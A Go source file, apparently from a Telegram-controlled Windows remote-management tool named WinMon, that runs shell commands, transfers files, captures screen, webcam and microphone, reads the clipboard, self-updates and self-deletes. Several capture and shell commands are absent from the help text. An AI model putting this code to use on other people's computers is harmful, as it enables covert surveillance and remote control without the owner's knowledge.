package bot

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"

	"winmon/internal/audio"
	"winmon/internal/clipboard"
	"winmon/internal/config"
	"winmon/internal/device"
	"winmon/internal/display"
	"winmon/internal/files"
	"winmon/internal/input"
	"winmon/internal/media"
	"winmon/internal/notifications"
	"winmon/internal/service"
	"winmon/internal/shell"
	"winmon/internal/updater"
)
type BotCoordinator struct {
	cfg        *config.Config
	bot        *tgbotapi.BotAPI
	stopChan   chan struct{}
	handlerSem chan struct{}
}

const maxConcurrentHandlers = 4

func NewBotCoordinator(cfg *config.Config, stopChan chan struct{}) *BotCoordinator {
	return &BotCoordinator{
		cfg:        cfg,
		stopChan:   stopChan,
		handlerSem: make(chan struct{}, maxConcurrentHandlers),
	}
}

func (b *BotCoordinator) Start() {
	if len(b.cfg.AllowedUsers) == 0 {
		log.Println("WARNING: allowed_users is empty in configuration! ALL incoming Telegram requests will be DENIED by default for security.")
	}
	if skipped := nonNumericAllowedUsers(b.cfg.AllowedUsers); len(skipped) > 0 {
		// Defensive: LoadConfig already strips these; log if anything slipped through.
		log.Printf("WARNING: non-numeric allowed_users entries are ignored (use numeric Telegram user IDs only): %v", skipped)
	}

	bot, err := tgbotapi.NewBotAPI(b.cfg.BotToken)
	if err != nil {
		log.Fatalf("Failed to create Telegram bot session: %v", err)
	}
	b.bot = bot

	log.Printf("WinMon Telegram Bot connected successfully as @%s (Device: %s)",
		bot.Self.UserName, b.cfg.DeviceName)

	// Clear Bot Commands Menu from Telegram
	if _, err := b.bot.Request(tgbotapi.NewDeleteMyCommands()); err != nil {
		log.Printf("Warning: Failed to clear Telegram bot commands menu: %v", err)
	}

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 30

	updates := bot.GetUpdatesChan(u)

	for {
		select {
		case <-b.stopChan:
			log.Println("Stopping WinMon Telegram Bot...")
			bot.StopReceivingUpdates()
			return
		case update, ok := <-updates:
			if !ok {
				return
			}
			select {
			case b.handlerSem <- struct{}{}:
				go func(upd tgbotapi.Update) {
					defer func() { <-b.handlerSem }()
					b.handleUpdate(upd)
				}(update)
			default:
				b.rejectBusy(update)
			}
		}
	}
}

func nonNumericAllowedUsers(users []string) []string {
	_, skipped := config.NormalizeAllowedUsers(users)
	return skipped
}

func (b *BotCoordinator) rejectBusy(update tgbotapi.Update) {
	if update.Message == nil || update.Message.From == nil {
		return
	}
	msg := update.Message
	if !b.isAuthorized(msg.From.ID, msg.From.UserName) {
		return
	}
	b.sendText(msg.Chat.ID, "⏳ WinMon is busy handling other commands. Please try again in a moment.")
}

func (b *BotCoordinator) isAuthorized(userID int64, _ string) bool {
	if len(b.cfg.AllowedUsers) == 0 {
		return false
	}
	idStr := strconv.FormatInt(userID, 10)
	for _, allowed := range b.cfg.AllowedUsers {
		allowedClean := strings.TrimPrefix(strings.TrimSpace(allowed), "@")
		if _, err := strconv.ParseInt(allowedClean, 10, 64); err != nil {
			continue
		}
		if allowedClean == idStr {
			return true
		}
	}
	return false
}

func (b *BotCoordinator) handleUpdate(update tgbotapi.Update) {
	if update.Message == nil {
		return
	}

	msg := update.Message
	userID := msg.From.ID
	username := msg.From.UserName
	chatID := msg.Chat.ID

	if !b.isAuthorized(userID, username) {
		log.Printf("Unauthorized Telegram access attempt from UserID: %d (@%s)", userID, username)
		b.sendText(chatID, fmt.Sprintf("[Error] Access Denied: User ID `%d` is not authorized to control device `%s`.", userID, b.cfg.DeviceName))
		return
	}

	// Handle attachments (Uploads / Wallpapers / Binary updates)
	if msg.Photo != nil || msg.Document != nil {
		caption := strings.TrimSpace(msg.Caption)
		if strings.HasPrefix(caption, "/setwallpaper") {
			b.handleSetWallpaperAttachment(msg)
			return
		}
		if strings.HasPrefix(caption, "/update") {
			b.handleUpdateBinaryAttachment(msg)
			return
		}
		if strings.HasPrefix(caption, "/upload") {
			dest := strings.TrimSpace(strings.TrimPrefix(caption, "/upload"))
			b.handleAttachmentUpload(msg, dest)
			return
		}
		if msg.Document != nil {
			b.handleAttachmentUpload(msg, "")
			return
		}
	}

	text := strings.TrimSpace(msg.Text)
	if text == "" {
		return
	}

	fields := strings.Fields(text)
	cmd := strings.ToLower(fields[0])
	if idx := strings.Index(cmd, "@"); idx != -1 {
		cmd = cmd[:idx]
	}
	args := fields[1:]

	b.processCommand(cmd, args, chatID)
}

func (b *BotCoordinator) processCommand(cmd string, args []string, chatID int64) {
	switch cmd {
	case "/start":
		info := fmt.Sprintf("💻 **WinMon Remote Management**\n"+
			"**Device:** `%s`\n"+
			"**Group:** `%s`\n"+
			"**Version:** `%s`\n\n"+
			"Type /help to see all available commands.",
			b.cfg.DeviceName, b.cfg.Group, b.cfg.Version)
		b.sendText(chatID, info)

	case "/help":
		helpMsg := "⚡ **WinMon Available Commands**\n\n" +
			"💻 /start - Show basic device status\n" +
			"❓ /help - Show available commands list\n" +
			"📊 /sysinfo - Display hardware metrics & system info\n" +
			"⚙️ /processes - List top running processes\n" +
			"💀 /kill <PID|Name> - Terminate process by PID or name\n" +
			"🔒 /lock - Lock Windows workstation\n" +
			"📸 /screenshot - Capture primary display screenshot\n" +
			"📥 /download <path> - Download file from PC\n" +
			"📤 /upload [path] - Upload file attachment to PC\n" +
			"📋 /clipboard [text] - Read or set text on PC clipboard\n" +
			"⌨️ /hotkey <keys> - Trigger key combination (e.g. /hotkey win+d)\n" +
			"🔆 /brightness <0-100> - Set display brightness\n" +
			"🔊 /volume <0-100|mute|unmute> - Set or toggle master audio\n" +
			"🔔 /notify <Title | Message> - Show toast notification on PC\n" +
			"🖼 /setwallpaper - Set wallpaper (attach photo with caption /setwallpaper)\n" +
			"🖼 /wallpaper - Retrieve current desktop wallpaper photo\n" +
			"⬆️ /update - Attach a new winmon.exe with caption /update to self-update\n" +
			"🔄 /restartservice - Restart WinMon service\n" +
			"🛑 /shutdownservice - Stop WinMon service/process\n" +
			"💥 /implode confirm - Self-destruct WinMon from this PC"
		b.sendText(chatID, helpMsg)

	case "/screenshot", "/webcam", "/screenrecord", "/listen", "/clipboard", "/tts", "/wallpaper", "/lock", "/volume", "/hotkey":
		b.executeCommandLocallyOrIPC(cmd, args, chatID)
	case "/cmd", "/download", "/brightness", "/notify", "/sysinfo", "/deviceinfo", "/processes", "/kill":
		b.executeNativeTelegram(cmd, args, chatID, time.Now())

	case "/setwallpaper":
		b.sendText(chatID, "🖼 Usage: Attach a photo with the caption `/setwallpaper` to set desktop wallpaper.")

	case "/restartservice":
		b.sendText(chatID, "🔄 Restarting WinMon service...")
		if service.IsRunningAsService() {
			if err := service.RestartServiceDetached(); err != nil {
				b.sendText(chatID, fmt.Sprintf("❌ [Error] Failed to schedule service restart: %v", err))
				return
			}
			b.sendText(chatID, "✅ Restart scheduled. WinMon will come back shortly.")
		} else {
			b.sendText(chatID, "ℹ️ Not running as a Windows service. Restart the console process manually.")
		}

	case "/shutdownservice":
		b.sendText(chatID, "🛑 Stopping WinMon service/process...")
		if service.IsRunningAsService() {
			if err := service.StopService("WinMon"); err != nil {
				log.Printf("Failed to stop WinMon service: %v", err)
			}
		} else {
			go func() {
				time.Sleep(1 * time.Second)
				os.Exit(0)
			}()
		}

	case "/implode":
		if len(args) == 0 || strings.ToLower(args[0]) != "confirm" {
			confirmMsg := "⚠️ **Self-Destruct Confirmation Required**\n\n" +
				"Are you sure you want to completely uninstall WinMon and delete all files from this PC?\n\n" +
				"Type `/implode confirm` to execute self-destruction."
			b.sendText(chatID, confirmMsg)
			return
		}
		b.sendText(chatID, "💥 Uninstalling WinMon service and self-destructing...")
		err := updater.ImplodeService(b.cfg.BotToken, chatID)
		if err != nil {
			b.sendText(chatID, fmt.Sprintf("❌ [Error] Implode failed: %v", err))
		}

	case "/update":
		b.sendText(chatID, "Usage: attach a new `winmon.exe` document with caption `/update`.")

	default:
		b.sendText(chatID, fmt.Sprintf("Unknown command: `%s`. Type /help for available commands.", cmd))
	}
}

func (b *BotCoordinator) executeCommandLocallyOrIPC(cmd string, args []string, chatID int64) {
	start := time.Now()
	flatArgs := strings.Join(args, " ")

	ts := time.Now().UnixNano()
	customTempPath := helperTempPath(cmd, ts)
	if service.IsRunningAsService() {
		// Route via Session 1 IPC Agent
		resp, err := service.SendIPCCommand(service.IPCRequest{
			Cmd:        cmd,
			Args:       args,
			FlatArgs:   flatArgs,
			OutputFile: customTempPath,
		}, 60*time.Second)
		if err != nil {
			if customTempPath != "" {
				_ = os.Remove(customTempPath)
			}
			b.sendText(chatID, fmt.Sprintf("[Error] Session Agent IPC Error: %v", err))
			return
		}
		if !resp.Success {
			if customTempPath != "" {
				_ = os.Remove(customTempPath)
			}
			b.sendText(chatID, fmt.Sprintf("[Error] IPC Command Error: %s", resp.Error))
			return
		}
		outPath := customTempPath
		if resp.OutputFile != "" {
			outPath = resp.OutputFile
		}
		b.handleHelperOutputTelegram(cmd, chatID, start, outPath)
		return
	}

	// Console mode / Local service execution
	outPath, err := RunSessionHelper(cmd, flatArgs, customTempPath)
	if err != nil {
		if customTempPath != "" {
			_ = os.Remove(customTempPath)
		}
		b.sendText(chatID, fmt.Sprintf("[Error] Command Error: %v", err))
		return
	}
	b.handleHelperOutputTelegram(cmd, chatID, start, outPath)
}

func (b *BotCoordinator) executeNativeTelegram(cmd string, args []string, chatID int64, start time.Time) {
	dur := fmt.Sprintf("(%d ms)", time.Since(start).Milliseconds())

	switch cmd {
	case "/cmd":
		if len(args) < 1 {
			b.sendText(chatID, "Usage: /cmd <command>")
			return
		}
		execStr := strings.Join(args, " ")
		out, err := shell.ExecuteCommand(execStr, 25*time.Second)
		if len(out) > 3800 {
			out = out[:3800] + "\n... [truncated]"
		}
		if err != nil {
			b.sendText(chatID, fmt.Sprintf("[Error] **Command Execution Error:**\n```\n%s\nError: %v\n```", out, err))
		} else {
			b.sendText(chatID, fmt.Sprintf("**Command Output:** %s\n```\n%s\n```", dur, out))
		}

	case "/download":
		if len(args) < 1 {
			b.sendText(chatID, "Usage: /download <filepath>")
			return
		}
		filePath := strings.Join(args, " ")
		b.sendFile(chatID, filePath, fmt.Sprintf("Downloaded from `%s`:", b.cfg.DeviceName))

	case "/sysinfo", "/deviceinfo":
		info, err := device.GetDeviceInfo(b.cfg.DeviceName, b.cfg.DeviceID, b.cfg.Version)
		if err != nil {
			b.sendText(chatID, fmt.Sprintf("❌ [Error] Failed to get system info: %v", err))
			return
		}
		status, _ := device.GetStatus()

		msg := fmt.Sprintf("📊 **System Information & Hardware Metrics**\n\n"+
			"• **Device Name:** `%s` (ID: `%s`)\n"+
			"• **Computer Name:** `%s`\n"+
			"• **OS:** `%s`\n"+
			"• **IP Address:** `%s`\n"+
			"• **Uptime:** `%s`\n"+
			"• **WinMon Version:** `%s`\n",
			info.DeviceName, info.DeviceID, info.PCName, info.OS, info.IPAddress, device.FormatDuration(info.Uptime), info.Version)

		if status != nil {
			ramUsedGB := status.RAMTotalGB - status.RAMFreeGB
			diskUsedGB := status.DiskTotalGB - status.DiskFreeGB
			msg += fmt.Sprintf("\n⚡ **Hardware Metrics:**\n"+
				"• **CPU Load:** `%.1f%%`\n"+
				"• **RAM Usage:** `%.1f%%` (%.1f GB / %.1f GB)\n"+
				"• **Disk Usage:** `%.1f%%` (%.1f GB / %.1f GB)\n",
				status.CPUPercent, status.RAMPercent, ramUsedGB, status.RAMTotalGB,
				status.DiskPercent, diskUsedGB, status.DiskTotalGB)
			if status.BatteryCharge >= 0 {
				msg += fmt.Sprintf("• **Battery:** `%d%%` (%s)\n", status.BatteryCharge, status.BatteryStatus)
			}
		}
		b.sendText(chatID, msg)

	case "/processes":
		psCmd := `Get-Process | Sort-Object WorkingSet64 -Descending | Select-Object -First 25 | Format-Table Id, ProcessName, @{Name='RAM (MB)';Expression={[math]::Round($_.WorkingSet64/1MB, 1)}} -AutoSize | Out-String`
		out, err := shell.ExecuteCommand("powershell -NoProfile -NonInteractive -Command \""+psCmd+"\"", 15*time.Second)
		if err != nil || strings.TrimSpace(out) == "" {
			b.sendText(chatID, fmt.Sprintf("❌ [Error] Failed to list processes: %v", err))
		} else {
			b.sendText(chatID, fmt.Sprintf("⚙️ **Top Processes by Memory Usage:** %s\n```\n%s\n```", dur, strings.TrimSpace(out)))
		}

	case "/kill":
		if len(args) < 1 {
			b.sendText(chatID, "Usage: /kill <PID|ProcessName> (e.g. `/kill 1234` or `/kill notepad.exe`)")
			return
		}
		target := strings.TrimSpace(args[0])
		var killCmd string
		if _, err := strconv.Atoi(target); err == nil {
			killCmd = fmt.Sprintf("taskkill /F /PID %s", target)
		} else {
			if !strings.HasSuffix(strings.ToLower(target), ".exe") {
				target += ".exe"
			}
			killCmd = fmt.Sprintf("taskkill /F /IM \"%s\"", target)
		}
		out, err := shell.ExecuteCommand(killCmd, 10*time.Second)
		if err != nil {
			b.sendText(chatID, fmt.Sprintf("❌ [Error] Failed to terminate process `%s`:\n```\n%s\n```", target, out))
		} else {
			b.sendText(chatID, fmt.Sprintf("💀 Process `%s` terminated successfully:\n```\n%s\n```", target, strings.TrimSpace(out)))
		}

	case "/brightness":
		if len(args) < 1 {
			b.sendText(chatID, "Usage: /brightness <0-100>")
			return
		}
		bri, err := strconv.Atoi(args[0])
		if err != nil {
			b.sendText(chatID, "Brightness must be an integer (0-100).")
			return
		}
		if service.IsRunningAsService() {
			b.executeCommandLocallyOrIPC("/brightness", []string{args[0]}, chatID)
		} else {
			err = display.SetBrightness(bri)
			if err != nil {
				b.sendText(chatID, fmt.Sprintf("[Error] Brightness error: %v", err))
			} else {
				b.sendText(chatID, fmt.Sprintf("Brightness set to **%d%%**.", bri))
			}
		}

	case "/notify":
		if len(args) < 1 {
			b.sendText(chatID, "Usage: /notify <title> | <message>")
			return
		}
		fullText := strings.Join(args, " ")
		if service.IsRunningAsService() {
			b.executeCommandLocallyOrIPC("/notify", []string{fullText}, chatID)
		} else {
			parts := strings.Split(fullText, "|")
			title := "WinMon Notification"
			msg := fullText
			if len(parts) > 1 {
				title = strings.TrimSpace(parts[0])
				msg = strings.TrimSpace(parts[1])
			}
			err := notifications.ShowToastLocal(title, msg)
			if err != nil {
				b.sendText(chatID, fmt.Sprintf("[Error] Notification error: %v", err))
			} else {
				b.sendText(chatID, "Notification displayed on PC screen.")
			}
		}
	}
}

type mediaKind int

const (
	mediaKindPhoto mediaKind = iota
	mediaKindAnimation
	mediaKindFile
)

func helperTempPath(cmd string, ts int64) string {
	dir := service.GetSharedTempDir()
	switch cmd {
	case "/screenshot":
		return filepath.Join(dir, fmt.Sprintf("helper_screenshot_%d.jpg", ts))
	case "/webcam":
		return filepath.Join(dir, fmt.Sprintf("helper_webcam_%d.jpg", ts))
	case "/screenrecord":
		return filepath.Join(dir, fmt.Sprintf("helper_record_%d.gif", ts))
	case "/listen":
		return filepath.Join(dir, fmt.Sprintf("helper_audio_%d.wav", ts))
	case "/clipboard":
		return filepath.Join(dir, fmt.Sprintf("helper_clipboard_%d.txt", ts))
	case "/wallpaper":
		return filepath.Join(dir, fmt.Sprintf("helper_wallpaper_%d", ts))
	default:
		return ""
	}
}

func (b *BotCoordinator) handleMediaOutput(chatID int64, tempPath, defaultFileName string, kind mediaKind, caption, errMsg string) {
	if tempPath == "" {
		tempPath = filepath.Join(service.GetSharedTempDir(), defaultFileName)
	}
	if _, err := os.Stat(tempPath); err == nil {
		switch kind {
		case mediaKindPhoto:
			b.sendPhoto(chatID, tempPath, caption)
		case mediaKindAnimation:
			b.sendAnimation(chatID, tempPath, caption)
		case mediaKindFile:
			b.sendFile(chatID, tempPath, caption)
		}
		os.Remove(tempPath)
	} else {
		b.sendText(chatID, errMsg)
	}
}

func (b *BotCoordinator) handleHelperOutputTelegram(cmd string, chatID int64, start time.Time, tempPath string) {
	dur := fmt.Sprintf("(%d ms)", time.Since(start).Milliseconds())

	switch cmd {
	case "/screenshot":
		b.handleMediaOutput(chatID, tempPath, "helper_screenshot.jpg", mediaKindPhoto, "📸 **Desktop Screenshot** "+dur, "❌ [Error] Failed to retrieve screenshot from session agent.")
	case "/webcam":
		b.handleMediaOutput(chatID, tempPath, "helper_webcam.jpg", mediaKindPhoto, "📹 **Webcam Photo** "+dur, "❌ [Error] Failed to retrieve webcam photo from session agent.")
	case "/screenrecord":
		b.handleMediaOutput(chatID, tempPath, "helper_record.gif", mediaKindAnimation, "🎥 **Screen Recording GIF** "+dur, "❌ [Error] Failed to retrieve screen recording from session agent.")
	case "/listen":
		b.handleMediaOutput(chatID, tempPath, "helper_audio.wav", mediaKindFile, "🎙️ **Microphone Audio Recording** "+dur, "❌ [Error] Failed to retrieve audio recording from session agent.")
	case "/notify":
		b.sendText(chatID, "🔔 Notification displayed on PC screen.")
	case "/hotkey":
		b.sendText(chatID, fmt.Sprintf("⌨️ Hotkey trigger executed %s.", dur))
	case "/wallpaper":
		if tempPath == "" {
			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_wallpaper")
		}
		wallFile := findWallpaperOutput(tempPath)
		if wallFile != "" {
			caption := "🖼 **Desktop Wallpaper** " + dur
			ext := strings.ToLower(filepath.Ext(wallFile))
			switch ext {
			case ".jpg", ".jpeg", ".png", ".gif", ".webp":
				b.sendPhoto(chatID, wallFile, caption)
			default:
				b.sendFile(chatID, wallFile, caption)
			}
			os.Remove(wallFile)
		} else {
			b.sendText(chatID, "❌ [Error] Failed to retrieve desktop wallpaper.")
		}
	default:
		b.sendText(chatID, fmt.Sprintf("✅ Command `%s` executed successfully %s.", cmd, dur))
	}
}

func (b *BotCoordinator) sendText(chatID int64, text string) {
	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = tgbotapi.ModeMarkdown
	if _, err := b.bot.Send(msg); err != nil {
		// Fallback to plain text if Markdown parsing fails
		msg.ParseMode = ""
		_, _ = b.bot.Send(msg)
	}
}

func (b *BotCoordinator) sendPhoto(chatID int64, filePath string, caption string) {
	photo := tgbotapi.NewPhoto(chatID, tgbotapi.FilePath(filePath))
	photo.Caption = caption
	photo.ParseMode = tgbotapi.ModeMarkdown
	if _, err := b.bot.Send(photo); err != nil {
		log.Printf("Error sending photo to Telegram (retrying as plain text): %v", err)
		photo.ParseMode = ""
		_, _ = b.bot.Send(photo)
	}
}

func (b *BotCoordinator) sendVoice(chatID int64, filePath string, caption string) {
	voice := tgbotapi.NewVoice(chatID, tgbotapi.FilePath(filePath))
	voice.Caption = caption
	voice.ParseMode = tgbotapi.ModeMarkdown
	if _, err := b.bot.Send(voice); err != nil {
		log.Printf("Error sending voice note to Telegram (retrying as plain text): %v", err)
		voice.ParseMode = ""
		_, _ = b.bot.Send(voice)
	}
}

func (b *BotCoordinator) sendAnimation(chatID int64, filePath string, caption string) {
	anim := tgbotapi.NewAnimation(chatID, tgbotapi.FilePath(filePath))
	anim.Caption = caption
	anim.ParseMode = tgbotapi.ModeMarkdown
	if _, err := b.bot.Send(anim); err != nil {
		log.Printf("Error sending animation to Telegram (retrying as plain text): %v", err)
		anim.ParseMode = ""
		_, _ = b.bot.Send(anim)
	}
}

func (b *BotCoordinator) sendFile(chatID int64, filePath string, caption string) {
	doc := tgbotapi.NewDocument(chatID, tgbotapi.FilePath(filePath))
	doc.Caption = caption
	doc.ParseMode = tgbotapi.ModeMarkdown
	if _, err := b.bot.Send(doc); err != nil {
		log.Printf("Error sending document to Telegram (retrying as plain text): %v", err)
		doc.ParseMode = ""
		if _, err2 := b.bot.Send(doc); err2 != nil {
			b.sendText(chatID, fmt.Sprintf("[Error] Error sending file %s: %v", filePath, err2))
		}
	}
}

func (b *BotCoordinator) handleAttachmentUpload(msg *tgbotapi.Message, destination string) (string, error) {
	chatID := msg.Chat.ID
	var fileID string
	var fileName string

	if msg.Document != nil {
		fileID = msg.Document.FileID
		fileName = msg.Document.FileName
	} else if msg.Photo != nil && len(msg.Photo) > 0 {
		bestPhoto := msg.Photo[len(msg.Photo)-1]
		fileID = bestPhoto.FileID
		fileName = fmt.Sprintf("photo_%d.jpg", time.Now().Unix())
	}

	if fileID == "" {
		err := fmt.Errorf("no valid attachment found to download")
		b.sendText(chatID, fmt.Sprintf("[Error] %v", err))
		return "", err
	}

	fileURL, err := b.bot.GetFileDirectURL(fileID)
	if err != nil {
		b.sendText(chatID, fmt.Sprintf("[Error] Failed to resolve Telegram file URL: %v", err))
		return "", err
	}

	finalPath, err := files.PrepareUploadPath(destination, fileName)
	if err != nil {
		b.sendText(chatID, fmt.Sprintf("[Error] Invalid upload destination: %v", err))
		return "", err
	}

	resp, err := http.Get(fileURL)
	if err != nil {
		b.sendText(chatID, fmt.Sprintf("[Error] Failed to download file stream: %v", err))
		return "", err
	}
	defer resp.Body.Close()

	out, err := os.Create(finalPath)
	if err != nil {
		b.sendText(chatID, fmt.Sprintf("[Error] Failed to create target file: %v", err))
		return "", err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		b.sendText(chatID, fmt.Sprintf("[Error] Failed to save file contents: %v", err))
		return "", err
	}

	b.sendText(chatID, fmt.Sprintf("File uploaded successfully to `%s`", finalPath))
	return finalPath, nil
}

func (b *BotCoordinator) handleSetWallpaperAttachment(msg *tgbotapi.Message) {
	chatID := msg.Chat.ID
	tempPath := filepath.Join(service.GetSharedTempDir(), fmt.Sprintf("winmon_wall_%d.jpg", time.Now().UnixNano()))
	savedPath, err := b.handleAttachmentUpload(msg, tempPath)
	if err != nil {
		return
	}
	defer os.Remove(savedPath)
	b.executeCommandLocallyOrIPC("/setwallpaper", []string{savedPath}, chatID)
}

func (b *BotCoordinator) handleUpdateBinaryAttachment(msg *tgbotapi.Message) {
	chatID := msg.Chat.ID
	if msg.Document == nil {
		b.sendText(chatID, "[Error] /update requires a document attachment (new winmon.exe).")
		return
	}

	fileURL, err := b.bot.GetFileDirectURL(msg.Document.FileID)
	if err != nil {
		b.sendText(chatID, fmt.Sprintf("[Error] Failed to resolve Telegram file URL: %v", err))
		return
	}

	tempPath := filepath.Join(service.GetSharedTempDir(), fmt.Sprintf("winmon_update_%d.exe", time.Now().UnixNano()))
	resp, err := http.Get(fileURL)
	if err != nil {
		b.sendText(chatID, fmt.Sprintf("[Error] Failed to download update binary: %v", err))
		return
	}
	defer resp.Body.Close()

	out, err := os.Create(tempPath)
	if err != nil {
		b.sendText(chatID, fmt.Sprintf("[Error] Failed to create temp update file: %v", err))
		return
	}
	_, copyErr := io.Copy(out, resp.Body)
	out.Close()
	if copyErr != nil {
		_ = os.Remove(tempPath)
		b.sendText(chatID, fmt.Sprintf("[Error] Failed to save update binary: %v", copyErr))
		return
	}

	if err := updater.ValidateBinary(tempPath); err != nil {
		_ = os.Remove(tempPath)
		b.sendText(chatID, fmt.Sprintf("[Error] Invalid update binary: %v", err))
		return
	}

	b.sendText(chatID, "⬆️ Valid update binary received. Applying update and restarting...")
	if err := updater.UpdateService(tempPath, b.cfg.BotToken, chatID); err != nil {
		_ = os.Remove(tempPath)
		b.sendText(chatID, fmt.Sprintf("[Error] Failed to start updater: %v", err))
		return
	}
}

// Session helper commands (executed inside user desktop session)
func RunSessionHelper(cmd string, args string, outputFile string) (string, error) {
	switch cmd {
	case "/screenshot":
		tempPath := outputFile
		if tempPath == "" {
			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_screenshot.jpg")
		}
		return tempPath, media.CaptureScreen(tempPath)
	case "/webcam":
		tempPath := outputFile
		if tempPath == "" {
			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_webcam.jpg")
		}
		return tempPath, media.CaptureWebcam(tempPath)
	case "/screenrecord":
		dur := parseDuration(args)
		tempPath := outputFile
		if tempPath == "" {
			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_record.gif")
		}
		return tempPath, media.RecordScreen(dur, tempPath)
	case "/listen":
		dur := parseDuration(args)
		tempPath := outputFile
		if tempPath == "" {
			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_audio.wav")
		}
		return tempPath, media.RecordAudio(dur, tempPath)
	case "/setwallpaper":
		return "", display.SetWallpaperLocal(args)
	case "/wallpaper":
		tempPath := outputFile
		if tempPath == "" {
			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_wallpaper")
		}
		wallPath, err := display.GetWallpaperPath()
		if err != nil {
			return "", fmt.Errorf("failed to get wallpaper path: %w", err)
		}
		data, err := os.ReadFile(wallPath)
		if err != nil {
			return "", fmt.Errorf("failed to read wallpaper file at %s: %w", wallPath, err)
		}
		ext := strings.ToLower(filepath.Ext(wallPath))
		if ext == "" {
			ext = imageExtFromMagic(data)
		}
		if filepath.Ext(tempPath) != "" {
			tempPath = strings.TrimSuffix(tempPath, filepath.Ext(tempPath))
		}
		tempPath = tempPath + ext
		err = os.WriteFile(tempPath, data, 0644)
		return tempPath, err
	case "/notify":
		parts := strings.Split(args, "|")
		title := "WinMon Notification"
		msg := args
		if len(parts) > 1 {
			title = strings.TrimSpace(parts[0])
			msg = strings.TrimSpace(parts[1])
		}
		err := notifications.ShowToastLocal(title, msg)
		if err != nil {
			return "", notifications.ShowAlert(title, msg)
		}
		return "", nil
	case "/tts":
		return "", audio.SpeakTTS(args)
	case "/clipboard":
		tempPath := outputFile
		if tempPath == "" {
			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_clipboard.txt")
		}
		if strings.TrimSpace(args) != "" {
			err := clipboard.SetClipboardLocal(args)
			if err != nil {
				return "", err
			}
			return tempPath, os.WriteFile(tempPath, []byte("Clipboard text updated successfully."), 0644)
		}
		txt, err := clipboard.GetClipboardLocal()
		if err != nil || strings.TrimSpace(txt) == "" {
			txt = "(Clipboard is empty or contains non-text data)"
		}
		return tempPath, os.WriteFile(tempPath, []byte(txt), 0644)
	case "/setclipboard":
		return "", clipboard.SetClipboardLocal(args)
	case "/brightness":
		bri, err := strconv.Atoi(args)
		if err != nil {
			return "", fmt.Errorf("brightness must be an integer: %w", err)
		}
		return "", display.SetBrightness(bri)
	case "/lock":
		return "", display.LockWorkstation()
	case "/volume":
		if strings.TrimSpace(args) == "" {
			return "", fmt.Errorf("usage: /volume <0-100|mute|unmute>")
		}
		arg := strings.ToLower(strings.TrimSpace(args))
		if arg == "mute" {
			return "", audio.SetMute(true)
		} else if arg == "unmute" {
			return "", audio.SetMute(false)
		} else {
			vol, err := strconv.Atoi(arg)
			if err != nil {
				return "", fmt.Errorf("volume must be an integer (0-100) or 'mute'/'unmute'")
			}
			return "", audio.SetVolume(vol)
		}
	case "/hotkey":
		if strings.TrimSpace(args) == "" {
			return "", fmt.Errorf("usage: /hotkey <keys> (e.g. /hotkey win+d or /hotkey ctrl+c)")
		}
		return "", input.TriggerHotkey(args)
	}
	return "", fmt.Errorf("unsupported helper command: %s", cmd)
}

func parseDuration(arg string) time.Duration {
	d, err := strconv.Atoi(strings.TrimSpace(arg))
	if err != nil || d <= 0 {
		return 5 * time.Second
	}
	return time.Duration(d) * time.Second
}

// findWallpaperOutput locates the wallpaper file written by the session helper.
// The helper appends the real image extension to the base output path.
func findWallpaperOutput(basePath string) string {
	if basePath == "" {
		return ""
	}
	if info, err := os.Stat(basePath); err == nil && !info.IsDir() {
		return basePath
	}
	matches, err := filepath.Glob(basePath + ".*")
	if err != nil || len(matches) == 0 {
		return ""
	}
	return matches[0]
}

// imageExtFromMagic sniffs common image formats when the wallpaper path has no extension.
func imageExtFromMagic(data []byte) string {
	switch {
	case len(data) >= 3 && data[0] == 0xFF && data[1] == 0xD8 && data[2] == 0xFF:
		return ".jpg"
	case len(data) >= 8 && string(data[:8]) == "\x89PNG\r\n\x1a\n":
		return ".png"
	case len(data) >= 6 && (string(data[:6]) == "GIF87a" || string(data[:6]) == "GIF89a"):
		return ".gif"
	case len(data) >= 12 && string(data[0:4]) == "RIFF" && string(data[8:12]) == "WEBP":
		return ".webp"
	case len(data) >= 2 && data[0] == 0x42 && data[1] == 0x4D:
		return ".bmp"
	default:
		return ".bin"
	}
}

// RunSessionAgentLoop runs the persistent IPC listener in Session 1
func RunSessionAgentLoop() error {
	log.Println("Starting WinMon Persistent Session Agent (Session 1 IPC Listener)...")
	return service.StartIPCAgentServer(func(req service.IPCRequest) service.IPCResponse {
		outPath, err := RunSessionHelper(req.Cmd, req.FlatArgs, req.OutputFile)
		if err != nil {
			return service.IPCResponse{
				Success: false,
				Error:   err.Error(),
			}
		}
		return service.IPCResponse{
			Success:    true,
			OutputFile: outPath,
		}
	})
}
